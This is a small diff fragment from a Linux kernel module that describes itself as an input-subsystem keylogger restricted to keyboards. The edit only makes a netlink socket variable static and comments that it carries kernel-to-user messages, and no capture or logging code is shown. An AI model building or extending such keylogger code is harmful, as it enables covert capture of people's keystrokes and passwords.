@@ -4,7 +4,7 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("System Administrator");
 MODULE_DESCRIPTION("Input Subsystem Keylogger Module - Keyboard Only Mode");
 
-struct sock *netlink_socket = NULL;
+static struct sock *netlink_socket = NULL; //maintains the Netlink socket for kernel-to-user communication.
 
 /* Filter: Monitor only devices that report EV_KEY events. */
 static const struct input_device_id keyboard_device_ids[] = {
